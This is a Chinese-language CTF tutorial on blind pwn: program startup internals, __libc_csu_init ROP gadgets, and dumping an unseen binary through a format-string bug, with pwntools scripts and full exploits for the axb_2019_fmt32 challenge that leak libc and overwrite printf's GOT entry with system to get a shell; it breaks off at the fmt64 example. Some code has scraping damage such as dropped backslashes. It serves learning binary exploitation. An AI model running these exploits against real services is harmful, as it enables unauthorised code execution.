# Pwn 盲打（Bilnd Pwn）的一般解决思路

阅读量 **1467512**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-01-09 11:31:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01ca775247cd95359c.png)

## 0x01 写在前面

最近出现了许多次`Bilnd Pwn`的题目，故在这里总结一些常见的思路。

本文的部分内容引用了大佬的博客原文，已在文章末尾的参考链接中注明了原作者。

## 0x02 前置知识

###  程序的一般启动过程

![](https://p3.ssl.qhimg.com/t01194430d55d54da9d.png)

### 关于`_start`函数

本部分内容均为一个空的main函数的编译结果，源码如下：

    
    
    int main()
    {
    }
    //gcc -ggdb -o prog1 prog1.c
    

**程序的启动**

当你执行一个程序的时候，shell或者GUI会调用execve()，它会执行linux系统调用execve()。如果你想了解关于execve()函数，你可以简单的在shell中输入`man
execve`。这些帮助来自于man手册（包含了所有系统调用）的第二节。简而言之，系统会为你设置栈，并且将`argc`，`argv`和`envp`压入栈中。文件描述符0，1和2（stdin,
stdout和stderr）保留shell之前的设置。加载器会帮你完成重定位，调用你设置的预初始化函数。当所有搞定之后，控制权会传递给`_start()`。

**`_start`函数的实现**

    
    
    080482e0 <_start>:
    80482e0:       31 ed                   xor    %ebp,%ebp
    80482e2:       5e                      pop    %esi
    80482e3:       89 e1                   mov    %esp,%ecx
    80482e5:       83 e4 f0                and    $0xfffffff0,%esp
    80482e8:       50                      push   %eax
    80482e9:       54                      push   %esp
    80482ea:       52                      push   %edx
    80482eb:       68 00 84 04 08          push   $0x8048400
    80482f0:       68 a0 83 04 08          push   $0x80483a0
    80482f5:       51                      push   %ecx
    80482f6:       56                      push   %esi
    80482f7:       68 94 83 04 08          push   $0x8048394
    80482fc:       e8 c3 ff ff ff          call   80482c4 <__libc_start_main@plt>
    8048301:       f4
    

  1. 任何值`xor`自身得到的结果都是0。所以`xor %ebp,%ebp`语句会把`%ebp`设置为0。ABI（Application Binary Interface specification）推荐这么做，目的是为了标记最外层函数的页帧（frame）。
  2. 接下来，从栈中弹出栈顶的值保存到`%esi`。在最开始的时候我们把`argc`，`argv`和`envp`放到了栈里，所以现在的`pop`语句会把`argc`放到`%esi`中。这里只是临时保存一下，稍后我们会把它再次压回栈中。因为我们弹出了`argc`，所以`%ebp`现在指向的是`argv`。
  3. `mov`指令把`argv`放到了`%ecx`中，但是并没有移动栈指针。
  4. 然后，将栈指针和一个可以清除后四位的掩码做`and`操作。根据当前栈指针的位置不同，栈指针将会向下移动0到15个字节。这么做，保证了任何情况下，栈指针都是16字节的偶数倍对齐的。对齐的目的是保证栈上所有的变量都能够被内存和cache快速的访问。要求这么做的是SSE，就是指令都能在单精度浮点数组上工作的那个（扩展指令集）。比如，某次运行时，`_start`函数刚被调用的时候，`%esp`处于`0xbffff770`。
  5. 在我们从栈上弹出`argc`后，`%esp`指向`0xbffff774`。它向高地址移动了（往栈里存放数据，栈指针地址向下增长；从栈中取出数据，栈指针地址向上增长）。当对栈指针执行了`and`操作后，栈指针回到了`0xbffff770`。
  6. 现在，我们把`__libc_start_main`函数的参数压入栈中。第一个参数`%eax`被压入栈中，里面保存了无效信息，原因是稍后会有七个参数将被压入栈中，但是为了保证16字节对齐，所以需要第八个参数。这个值也并不会被用到。
  7. `%esp`，存放了`void (*stack_end)`,即为已被对齐的栈指针。
  8. `%edx`，存放了`void (*rtld_fini)(void)`,即为加载器传到edx中的动态链接器的析构函数。被`__libc_start_main`函数通过`__cxat_exit()`注册，为我们已经加载的动态库调用`FINI section`。
  9. `%8048400`，存放了`void (*fini)(void)`,即为`__libc_csu_fini`——程序的析构函数。被`__libc_start_main`通过`__cxat_exit()`注册。
  10. `%80483A0`，存放了`void (*init)(void)`,即为`__libc_csu_init`——程序的构造函数。于`main`函数之前被`__libc_start_main`函数调用。
  11. `%ecx`，存放了`char **ubp_av`,即为argv相对栈的偏移值。
  12. `%esi`，存放了`argc`,即为argc相对栈的偏移值。
  13. `0x8048394`，存放了`int (*main)(int,char**,char**)`,即为我们程序的`main`函数，被`__libc_start_main`函数调用`main`函数的返回值被传递给`exit()`函数，用于终结我们的程序。

**`__libc_start_main`函数**

`__libc_start_main`是在链接的时候从glibc复制过来的。在glibc的代码中，它位于`csu/libc-start.c`文件里。`__libc_start_main`的定义如下：

    
    
    int __libc_start_main(  
        int (*main) (int, char **, char **),
        int argc, char ** ubp_av,
        void (*init) (void),
        void (*fini) (void),
        void (*rtld_fini) (void),
        void (* stack_end)
    );
    

所以，我们期望`_start`函数能够将`__libc_start_main`需要的参数按照逆序压入栈中。

![](https://p4.ssl.qhimg.com/t0113955b6ae71a7919.jpg)

### 关于`__libc_csu_init`函数的利用

**`__libc_csu_init`函数的实现**

    
    
    .text:0000000000400840 ; ===================== S U B R O U T I N E ====================
    .text:0000000000400840
    .text:0000000000400840
    .text:0000000000400840                 public __libc_csu_init
    .text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16
    .text:0000000000400840                 push    r15
    .text:0000000000400842                 mov     r15d, edi
    .text:0000000000400845                 push    r14
    .text:0000000000400847                 mov     r14, rsi
    .text:000000000040084A                 push    r13
    .text:000000000040084C                 mov     r13, rdx
    .text:000000000040084F                 push    r12
    .text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry
    .text:0000000000400858                 push    rbp
    .text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry
    .text:0000000000400860                 push    rbx
    .text:0000000000400861                 sub     rbp, r12
    .text:0000000000400864                 xor     ebx, ebx
    .text:0000000000400866                 sar     rbp, 3
    .text:000000000040086A                 sub     rsp, 8
    .text:000000000040086E                 call    _init_proc
    .text:0000000000400873                 test    rbp, rbp
    .text:0000000000400876                 jz      short loc_400896
    .text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]
    .text:0000000000400880
    .text:0000000000400880 loc_400880:                      ; CODE XREF: __libc_csu_init+54
    .text:0000000000400880                 mov     rdx, r13
    .text:0000000000400883                 mov     rsi, r14
    .text:0000000000400886                 mov     edi, r15d
    .text:0000000000400889                 call    qword ptr [r12+rbx*8]
    .text:000000000040088D                 add     rbx, 1
    .text:0000000000400891                 cmp     rbx, rbp
    .text:0000000000400894                 jnz     short loc_400880
    .text:0000000000400896
    .text:0000000000400896 loc_400896:                      ; CODE XREF: __libc_csu_init+36
    .text:0000000000400896                 add     rsp, 8
    .text:000000000040089A                 pop     rbx
    .text:000000000040089B                 pop     rbp
    .text:000000000040089C                 pop     r12
    .text:000000000040089E                 pop     r13
    .text:00000000004008A0                 pop     r14
    .text:00000000004008A2                 pop     r15
    .text:00000000004008A4                 retn
    .text:00000000004008A4 __libc_csu_init endp
    .text:00000000004008A4
    .text:00000000004008A4 ; -------------------------------------------------------------------    

**可利用的ROP链构造**

x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8 和 R9 中，那么我们可以很明显的看出一些gadget。

    
    
    .text:000000000040084C        mov  R13 , rdx        ; R13  = rdx  = arg3
    .text:0000000000400847        mov  R14 , rsi        ; R14  = rsi  = arg2
    .text:0000000000400842        mov  R15d, edi        ; R15d = edi  = arg1
    .text:0000000000400880         mov  rdx , R13        ; rdx  = R13  
    .text:0000000000400883        mov  rsi , R14        ; rsi  = R14  
    .text:0000000000400886        mov  edi , R15d        ; rdi  = R15d
    

那么我们可以构造以下ROP链：

    
    
    .text:0000000000400???            retn                        ; 漏洞函数的return，设置为0x40089A
    .text:000000000040089A            pop   rbx                    ; 建议置零
    .text:000000000040089B            pop   rbp                    ; 建议置1，以防跳入循环
    .text:000000000040089C            pop   r12                    ; ROP链执行完毕后的返回地址
    .text:000000000040089E             pop   r13                    ; RDX，即ROP链执行过程中跳入函数的arg3
    .text:00000000004008A0            pop   r14                    ; RSI，即ROP链执行过程中跳入函数的arg2
    .text:00000000004008A2            pop   r15                    ; EDI，即ROP链执行过程中跳入函数的arg1
    .text:00000000004008A4            retn                        ; 设置为0x400880
    .text:0000000000400880            mov   rdx, r13                ; ROP链执行过程中跳入函数的arg3
    .text:0000000000400883            mov   rsi, r14                ; ROP链执行过程中跳入函数的arg2
    .text:0000000000400886            mov   edi, r15d                ; ROP链执行过程中跳入函数的arg1
    .text:0000000000400889            call  qword ptr [r12+rbx*8]    ; CALL [R12]
    .text:000000000040088D            add   rbx, 1                ; RBX = 0 -> RBX = 1
    .text:0000000000400891            cmp   rbx, rbp                ; RBX = RBP = 1
    .text:0000000000400894            jnz   short loc_400880        ; 跳转未实现
    .text:0000000000400896            add   rsp, 8                ; 抬高栈顶
    .text:000000000040089A            pop   rbx                    ; 
    .text:000000000040089B            pop   rbp                    ; 
    .text:000000000040089C            pop   r12                    ; 
    .text:000000000040089E             pop   r13                    ; 
    .text:00000000004008A0            pop   r14                    ; 
    .text:00000000004008A2            pop   r15                    ; 
    .text:00000000004008A4            retn                        ; 设置为下一步的返回地址
    

payload可以按如下方式布置：

    
    
    pop_init = 0x40075A 
    pop_init_next = 0x400740 
    payload = '....'
    payload += p64(pop_init)        #goto __libc_csu_init
    payload += p64(0)                #pop rbx
    payload += p64(1)                #pop ebp
    payload += p64(got_xxx)            #pop r12
    payload += p64(argv3)            #pop 13 = pop rdx
    payload += p64(argv2)            #pop 14 = pop rsi
    payload += p64(argv1)            #pop 15 = pop rdi
    payload += p64(pop_init_next)    #ret
    payload += 'x00' * 8 * 7         # pop 6 + RBP
    payload += p64(addr_main)        #ret
    

###  错位构造gadget

**`pop rdi;ret;`构造**

在0x4008A2处的语句是`pop r15;ret;`，它的字节码是`41 5f c3`。

而`pop rdi;ret;`的字节码是`5f c3`。

那么当EIP指向0x4008A3时，程序事实上将会执行`pop rdi;ret;`。

**`pop rsi;pop r15;ret;`构造**

同理0x4008A0处的语句是`pop r14;pop r15;ret;`，它的字节码是`41 5e 41 5f c3`。

而`pop rsi;pop r15;ret;`的字节码是`5e 41 5f c3`。

那么当EIP指向0x4008A1时，程序事实上将会执行`pop rsi;pop r15;ret;`。

## 0x03 利用格式化字符串漏洞泄漏整个二进制文件

###  原理简述

格式化字符串的原理本文不再赘述，对于泄漏文件，我们常用的几个格式化控制符为：

  1. %N$p：以16进制的格式输出位于printf第N个参数位置的值；
  2. %N$s：以printf第N个参数位置的值为地址，输出这个地址指向的字符串的内容；
  3. %N$n：以printf第N个参数位置的值为地址，将输出过的字符数量的值写入这个地址中，对于32位elf而言，%n是写入4个字节，%hn是写入2个字节，%hhn是写入一个字节；
  4. %Nc：输出N个字符，这个可以配合%N$n使用，达到任意地址任意值写入的目的。

###  Demo

**漏洞环境搭建**

以下为Demo源码

    
    
    //blind_pwn_printf_demo.c
    #include <stdio.h>
    #include <unistd.h>
    int main()
    {
        setbuf(stdin, 0LL);
        setbuf(stdout, 0LL);
        setbuf(stderr, 0LL);
        char buf[100];
        while (1)
        {  
            read(STDIN_FILENO, buf, 100);
            rintf(buf);
            putchar('n');
        }
        return 0;
    }
    //gcc -z execstack -fno-stack-protector -no-pie -o blind_pwn_printf_demo_x64 blind_pwn_printf_demo.c
    //gcc -z execstack -fno-stack-protector -no-pie -m32 -o blind_pwn_printf_demo_x32 blind_pwn_printf_demo.c
    

此处我们不再启用服务器，直接用process加载本地文件，试图泄漏出文件副本。

**Leak Stack & Where is `.text`**

这里我们使用`%n$p`来循环泄漏`Stack`数据，此处我们先泄露400byte的stack data。

    
    
    def where_is_start():
        for i in range(100):
            payload = '%%%d$p.TMP' % (i)
            sh.sendline(payload)
            val = sh.recvuntil('.TMP')
            log.info(str(i*4)+' '+val.strip().ljust(10))
            sh.recvrepeat(0.2)
    

⚠：此处`%%=%`、`%d=i`、x32下每次泄漏4字节，因此有`ix4`。

Leak result:

    
    
    [*] 0 %0$p.TMP  
    [*] 4 0xffd64ccc.TMP
    [*] 8 0x64.TMP  
    [*] 12 0xf7e006bb.TMP
    [*] 16 0xffd64cee.TMP
    [*] 20 0xffd64dec.TMP
    [*] 24 0xe0.TMP  
    [*] 28 0x70243725.TMP
    [*] 32 0x504d542e.TMP
    [*] 36 0xf7f6990a.TMP
    [*] 40 0xffd64cf0.TMP
    [*] 44 0x80482d5.TMP
    [*] 48 (nil).TMP 
    [*] 52 0xffd64d84.TMP
    [*] 56 0xf7f22000.TMP
    [*] 60 0x6f17.TMP
    [*] 64 0xffffffff.TMP
    [*] 68 0x2f.TMP  
    [*] 72 0xf7d7cdc8.TMP
    [*] 76 0xf7f3f1b0.TMP
    [*] 80 0x8000.TMP
    [*] 84 0xf7f22000.TMP
    [*] 88 0xf7f20244.TMP
    [*] 92 0xf7d880ec.TMP
    [*] 96 0x1.TMP   
    [*] 100 0x1.TMP   
    [*] 104 0xf7d9ea50.TMP
    [*] 108 0x80485eb.TMP
    [*] 112 0x1.TMP   
    [*] 116 0xffd64de4.TMP
    [*] 120 0xffd64dec.TMP
    [*] 124 0x80485c1.TMP
    [*] 128 0xf7f223dc.TMP
    [*] 132 0xffd64d50.TMP
    [*] 136 (nil).TMP 
    [*] 140 0xf7d88637.TMP
    [*] 144 0xf7f22000.TMP
    [*] 148 0xf7f22000.TMP
    [*] 152 (nil).TMP 
    [*] 156 0xf7d88637.TMP
    [*] 160 0x1.TMP   
    [*] 164 0xffd64de4.TMP
    [*] 168 0xffd64dec.TMP
    [*] 172 (nil).TMP 
    [*] 176 (nil).TMP 
    [*] 180 (nil).TMP 
    [*] 184 0xf7f22000.TMP
    [*] 188 0xf7f69c04.TMP
    [*] 192 0xf7f69000.TMP
    [*] 196 (nil).TMP 
    [*] 200 0xf7f22000.TMP
    [*] 204 0xf7f22000.TMP
    [*] 208 (nil).TMP 
    [*] 212 0xc2983082.TMP
    [*] 216 0xdf097e92.TMP
    [*] 220 (nil).TMP 
    [*] 224 (nil).TMP 
    [*] 228 (nil).TMP 
    [*] 232 0x1.TMP   
    [*] 236 0x8048420.TMP
    [*] 240 (nil).TMP 
    [*] 244 0xf7f5a010.TMP
    [*] 248 0xf7f54880.TMP
    [*] 252 0xf7f69000.TMP
    [*] 256 0x1.TMP   
    [*] 260 0x8048420.TMP
    [*] 264 (nil).TMP 
    [*] 268 0x8048441.TMP
    [*] 272 0x804851b.TMP
    [*] 276 0x1.TMP   
    [*] 280 0xffd64de4.TMP
    [*] 284 0x80485a0.TMP
    [*] 288 0x8048600.TMP
    [*] 292 0xf7f54880.TMP
    [*] 296 0xffd64ddc.TMP
    [*] 300 0xf7f69918.TMP
    [*] 304 0x1.TMP   
    [*] 308 0xffd66246.TMP
    [*] 312 (nil).TMP 
    [*] 316 0xffd66262.TMP
    [*] 320 0xffd66283.TMP
    [*] 324 0xffd662b7.TMP
    [*] 328 0xffd662e3.TMP
    [*] 332 0xffd66303.TMP
    [*] 336 0xffd66318.TMP
    [*] 340 0xffd6632a.TMP
    [*] 344 0xffd6633b.TMP
    [*] 348 0xffd66349.TMP
    [*] 352 0xffd663de.TMP
    [*] 356 0xffd663e9.TMP
    [*] 360 0xffd66400.TMP
    [*] 364 0xffd6640b.TMP
    [*] 368 0xffd6641c.TMP
    [*] 372 0xffd66430.TMP
    [*] 376 0xffd66440.TMP
    [*] 380 0xffd6647a.TMP
    [*] 384 0xffd664a0.TMP
    [*] 388 0xffd664af.TMP
    [*] 392 0xffd66501.TMP
    [*] 396 0xffd66509.TMP
    

我们希望能从泄露的数据中获取`_start`函数的地址，而`_start`函数正是`.text`(代码段)的起始地址。

此处我们发现了在泄露序号为236和260的位置出现了相同的明显位于`.text`段中的相同地址，这就是`_start`函数的地址。

**Dump`.text`**

首先，我们需要先确定我们的格式化字符串位置，再利用格式化字符串漏洞中的任意地址读漏洞来dump整个`.text`段。

已知我们输入的字符串一定是`%N$p`，转换成十六进制就是`0x25??2470`，由于数据在内存中是逆序存储的，很容易可以发现，当`N=7`时，回显的是`[*]
28 0x70243725.TMP`，也就是说，我们接下来要使用`%8$s+addr`的格式化控制符来泄露代码段数据。

⚠此处注意：%s进行输出时实际上是x00截断的，但是.text段中不可避免会出现x00，但是我们注意到还有一个特性，如果对一个x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为x00，所以可以设置为x00然后将地址加1进行dump。

    
    
    def dump_text(start_addr=0):
        text_segment=''
        try:
            while True:
                payload = 'Leak--->%11$s<-|'+p32(start_addr)
                sh.sendline(payload)
                sh.recvuntil('Leak--->')
                value = sh.recvuntil('<-|').strip('<-|')
                text_segment += value
                start_addr += len(value)
                if(len(value)==0):
                    text_segment += 'x00'
                    start_addr += 1
                if(text_segment[-9:-1]=='x00'*8):
                    break
        except Exception as e:
            print(e)
        finally:
            log.info('We get ' + str(len(text_segment)) +'byte file!')
            with open('blind_pwn_printf_demo_x32_dump','wb') as fout:
                fout.write(text_segment)
    

接下来我们使用IDA对我们Dump出的文件进行分析

⚠：如果分析结果与理论结果不同，请将dump文件与正确文件进行逐字节比对！

**IDA文件修复**

![](https://p2.ssl.qhimg.com/dm/1024_819_/t011eb0a825fa340244.png)

我们知道，因为是我们dump出的文件，因此IDA无法识别它的文件类型，我们直接加载为`Binary File`。

此处我们已经获知了`.text`段的偏移，于是我们加入这个offset。

![](https://p1.ssl.qhimg.com/dm/1024_819_/t01b19581224a9f9ad9.png)

我们发现默认情形下程序就为我们分析出了三个函数。

![](https://p3.ssl.qhimg.com/dm/1024_640_/t01a9fb2f2ab2e7225f.png)

但我们显然知道我们的`.text`段起始即为`_start`函数，于是我们手动强制分析其为函数。

![](https://p3.ssl.qhimg.com/dm/1024_721_/t013cfce17b52c9b010.png)

此处我们需要引入关于程序启动的实现说明。

![](https://p5.ssl.qhimg.com/t01e124e9ca67fabca3.png)

可以看出，`_start`函数将会调用`__libc_start_main`函数，而该函数并不在`.text`段中，因此我们无法对其进行分析。具体的`_start`函数放在了前置知识一栏。也就是此处几个压栈操作压入了main函数的地址，紧接着程序调用的是`__libc_start_main`函数，那么显然0x080483F0处的函数为`__libc_start_main`函数，0x804851B的函数为`main()`函数。跟进分析`main()`,发现自动分析的汇编码非常混乱，于是使用重定义函数的方法予以解决，首先取消所有函数的定义，然后在00x804851B处再次定义函数。

![](https://p0.ssl.qhimg.com/dm/939_1024_/t0156cd608217988506.png)

F5查看反编译码

![](https://p5.ssl.qhimg.com/dm/1024_349_/t01ab1baf241dff2b2a.png)

我们至少能够从参数列表推测出`read`和`printf`函数，对于缓冲区比较熟悉的话也能看出`setbuf`、`stdin`、`stdout`和`stderr`。

也就是：

    
    
    read@plt:0x80483D0
    printf@plt:0x80483E0
    setbuf@plt:0x80483C0
    

利用劫持got的方式劫持EIP或者利用stack overflow的方式劫持EIP的具体操作不再赘述。

**最终Leak脚本**

    
    
    from pwn import *
    import sys
    context.log_level='debug'
    
    if args['REMOTE']:
        sh = remote(sys.argv[1], sys.argv[2])
    else:
        sh = process("./blind_pwn_printf_demo_x32")
    
    def where_is_start(ret_index=null):
        return_addr=0
        for i in range(100):
            payload = '%%%d$p.TMP' % (i)
            sh.sendline(payload)
            val = sh.recvuntil('.TMP')
            log.info(str(i*4)+' '+val.strip().ljust(10))
            if(i*4==ret_index):
                return_addr=int(val.strip('.TMP').ljust(10)[2:],16)
                return return_addr
            sh.recvrepeat(0.2)
    
    def dump_text(start_addr=0):
        text_segment=''
        try:
            while True:
                payload = 'Leak--->%11$s<-|'+p32(start_addr)
                sh.sendline(payload)
                sh.recvuntil('Leak--->')
                value = sh.recvuntil('<-|').strip('<-|')
                text_segment += value
                start_addr += len(value)
                if(len(value)==0):
                    text_segment += 'x00'
                    start_addr += 1
                if(text_segment[-9:-1]=='x00'*8):
                    break
        except Exception as e:
            print(e)
        finally:
            log.info('We get ' + str(len(text_segment)) +'byte file!')
            with open('blind_pwn_printf_demo_x32_dump','wb') as fout:
                fout.write(text_segment)
    
    start_addr=where_is_start()
    dump_text(start_addr)
    

使用方法：首先注释`dump_text`函数，查看`leak`结果，并确定`_start`函数位置，将位置填入`where_is_start()`的参数区域，解除`dump_text`函数的注释。

###  以axb_2019_fmt32为例

⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。

**Leak Stack & Where is `.text`**

这里泄露的数据中出现了大量的`(nil)`，重复部分已被隐去。

    
    
    [*] 0 %0$p      
    [*] 4 0x804888d 
    [*] 8 0xff8e45ef
    [*] 12 0xf7f4d53c
    [*] 16 0xff8e45f8
    [*] 20 0xf7f295c5
    [*] 24 0x13      
    [*] 28 0x258e46e4
    [*] 32 0x3c702438
    [*] 36 0xa7c2d2d 
    [*] 40 0xa       
    [*] 44 (nil)     
    ....... (nil)       
    [*] 284 (nil)     
    [*] 288 0x65706552
    [*] 292 0x72657461
    [*] 296 0x3437253a
    [*] 300 0x2d3c7024
    [*] 304 0xa0a7c2d 
    [*] 308 (nil)     
    ....... (nil)    
    [*] 584 (nil)     
    [*] 588 0xb9008800
    [*] 592 0xf7f1b3dc
    [*] 596 0xff8e4840
    [*] 600 (nil)     
    [*] 604 0xf7d83637
    [*] 608 0xf7f1b000
    [*] 612 0xf7f1b000
    [*] 616 (nil)     
    [*] 620 0xf7d83637
    [*] 624 0x1       
    [*] 628 0xff8e48d4
    [*] 632 0xff8e48dc
    [*] 636 (nil)     
    [*] 640 (nil)     
    [*] 644 (nil)     
    [*] 648 0xf7f1b000
    [*] 652 0xf7f4dc04
    [*] 656 0xf7f4d000
    [*] 660 (nil)     
    [*] 664 0xf7f1b000
    [*] 668 0xf7f1b000
    [*] 672 (nil)     
    [*] 676 0x7d0c2af6
    [*] 680 0xd1f744e6
    [*] 684 (nil)     
    [*] 688 (nil)     
    [*] 692 (nil)     
    [*] 696 0x1       
    [*] 700 0x8048500 
    [*] 704 (nil)     
    [*] 708 0xf7f3dff0
    [*] 712 0xf7f38880
    [*] 716 0xf7f4d000
    [*] 720 0x1       
    [*] 724 0x8048500 
    [*] 728 (nil)     
    [*] 732 0x8048521 
    [*] 736 0x80485fb 
    [*] 740 0x1       
    [*] 744 0xff8e48d4
    [*] 748 0x8048760 
    [*] 752 0x80487c0 
    [*] 756 0xf7f38880
    [*] 760 0xff8e48cc
    [*] 764 0xf7f4d918
    [*] 768 0x1       
    [*] 772 0xff8e5f37
    [*] 776 (nil)     
    [*] 780 0xff8e5f41
    [*] 784 0xff8e5f57
    [*] 788 0xff8e5f5f
    [*] 792 0xff8e5f6a
    [*] 796 0xff8e5f7f
    [*] 800 0xff8e5fc1
    [*] 804 0xff8e5fc7
    [*] 808 0xff8e5fd5
    [*] 812 (nil)     
    [*] 816 0x20      
    [*] 820 0xf7f28070
    [*] 824 0x21      
    [*] 828 0xf7f27000
    [*] 832 0x10      
    [*] 836 0xf8bfbff 
    [*] 840 0x6       
    [*] 844 0x1000    
    [*] 848 0x11      
    [*] 852 0x64      
    [*] 856 0x3       
    [*] 860 0x8048034 
    [*] 864 0x4       
    [*] 868 0x20      
    [*] 872 0x5       
    [*] 876 0x9       
    [*] 880 0x7       
    [*] 884 0xf7f29000
    [*] 888 0x8       
    [*] 892 (nil)     
    [*] 896 0x9       
    [*] 900 0x8048500 
    [*] 904 0xb       
    [*] 908 0x3e8     
    [*] 912 0xc       
    [*] 916 0x3e8     
    [*] 920 0xd       
    [*] 924 0x3e8     
    [*] 928 0xe       
    [*] 932 0x3e8     
    [*] 936 0x17      
    [*] 940 (nil)     
    [*] 944 0x19      
    [*] 948 0xff8e49ab
    [*] 952 0x1a      
    [*] 956 (nil)     
    [*] 960 0x1f      
    [*] 964 0xff8e5fee
    [*] 968 0xf       
    [*] 972 0xff8e49bb
    [*] 976 (nil)     
    [*] 980 (nil)     
    [*] 984 0x3f000000
    [*] 988 0x55b90088
    [*] 992 0x5484b0ce
    [*] 996 0x96a61291
    [*] 1000 0x69827162
    [*] 1004 0x363836  
    [*] 1008 (nil)     
    ....... (nil)     
    [*] 1112 (nil)
    

此处我们发现了在泄露序号为700和724的位置出现了相同的明显位于`.text`段中的相同地址，这就是`_start`函数的地址。

同时也已经发现了格式化字符串位于288处，即偏移为72，构建偏移，泄露文件。

注意此处因为`_start`函数地址末尾以`x00`结尾，那么我们首先先将地址+1，泄露完毕后再手动填入一字节`x31`

**IDA文件修复 &分析**

![](https://p0.ssl.qhimg.com/dm/1024_721_/t01b3d64838d4a94390.png)

填入偏移，修复`_start`函数，`main`函数，反编译。

![](https://p2.ssl.qhimg.com/dm/1024_679_/t01c9b164c012ca213c.png)

我们显然可以确定printf的plt表地址为`0x8048470`

**泄露printf的got表地址**

我们接下来泄露`printf[@plt](https://github.com/plt
"@plt")`也就是`0x8048470`处的指令内容，以获取`printf[@got](https://github.com/got
"@got")`的位置。

    
    
    printf_plt=0x8048470
    payload = 'Leak-->%78$s<-|'+p32(printf_plt)
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    sh.recvuntil('Repeater:Leak-->')
    print(disasm(sh.recvuntil('<-|').strip('<-|')))
    

![](https://p0.ssl.qhimg.com/dm/1024_644_/t01207c89ae56f87a41.png)

**Leak libc & Final exp**

现在，我们只需要获取`printf[@got](https://github.com/got
"@got")`的内容即可计算出libc基址，并且劫持got表地址。

    
    
    from pwn import *
    import sys
    context.log_level='debug'
    
    libc=ELF("./libc-2.23.so")
    sh = remote('node3.buuoj.cn', 26316)
    # libc=ELF("/lib/i386-linux-gnu/libc.so.6")
    # sh = process('../BUUOJ/Pwn/axb_2019_fmt32')
    
    def where_is_start(ret_index=null):
        return_addr=0
        for i in range(400):
            payload = '%%%d$p<--|' % (i)
            sh.recvuntil('Please tell me:')
            sh.sendline(payload)
            sh.recvuntil('Repeater:')
            val = sh.recvuntil('<--|')
            log.info(str(i*4).ljust(4)+' '+val.strip('<--|').ljust(10))
            if(i*4==ret_index):
                return_addr=int(val.strip('<--|').ljust(10)[2:],16)
                return return_addr
            # sh.recvrepeat(0.2)
    
    def dump_text(start_addr=0):
        text_segment=''
        try:
            while True:
                payload = 'Leak-->%78$s<-|'+p32(start_addr)
                sh.recvuntil('Please tell me:')
                sh.sendline(payload)
                sh.recvuntil('Repeater:Leak-->')
                value = sh.recvuntil('<-|').strip('<-|')
                text_segment += value
                start_addr += len(value)
                if(len(value)==0):
                    text_segment += 'x00'
                    start_addr += 1
                if(text_segment[-9:-1]=='x00'*8):
                    break
        except Exception as e:
            print(e)
        finally:
            log.info('We get ' + str(len(text_segment)) +'byte file!')
            with open('axb_2019_fmt32_dump','wb') as fout:
                fout.write(text_segment)
    
    # start_addr=where_is_start(700)
    # dump_text(0x08048501)
    printf_plt=0x8048470
    # payload = 'Leak-->%78$s<-|'+p32(printf_plt)
    # sh.recvuntil('Please tell me:')
    # sh.sendline(payload)
    # sh.recvuntil('Repeater:Leak-->')
    # print(disasm(sh.recvuntil('<-|').strip('<-|')))
    printf_got=0x804a014
    payload = 'Leak-->%78$s<-|'+p32(printf_got)
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    sh.recvuntil('Repeater:Leak-->')
    printf_addr=u32(sh.recvuntil('<-|')[:4])
    libc_addr=printf_addr-libc.symbols['printf']
    system_addr=libc_addr+libc.symbols['system']
    log.success("libc base address is "+str(hex(libc_addr)))
    log.success("system address is "+str(hex(system_addr)))
    system_addr_byte_1 = system_addr & 0xff
    system_addr_byte_2 = (system_addr % 0xffff00) >> 8
    payload  = '%' + str(system_addr_byte_1 - 9) + 'c' + '%87$hhn'
    payload += '%' + str(system_addr_byte_2 - system_addr_byte_1 + 9 - 0x100) + 'c' + '%88$hn'
    payload  = payload.ljust(0x32+1)
    payload += p32(printf_got)+p32(printf_got+1)
    sh.recvuntil('Please tell me:')
    sh.sendline(payload)
    # gdb.attach(sh)
    sh.sendline(';/bin/shx00')
    sh.interactive()
    # print(sh.recv())
    

###  以axb_2019_fmt64为例

⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。

题目给了一个txt文件，内容如下：

    
    
    $ readelf -s stilltest
    
    Symbol table '.dynsym' contains 15 entries:
       Num:    Value          Size Type    Bind   Vis      Ndx Name
         0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
         1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
         2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)
         3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)
         4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
         5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)
         6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)
         7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)
         8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
         9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
        10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)
        11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)
        12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)
        13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)
        14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)
    

我们还是先尝试泄露源文件。

**Leak Stack & Where is `.text`**

这里泄露的数据中出现了大量的`(nil)`，重复部分已被隐去。

    
    
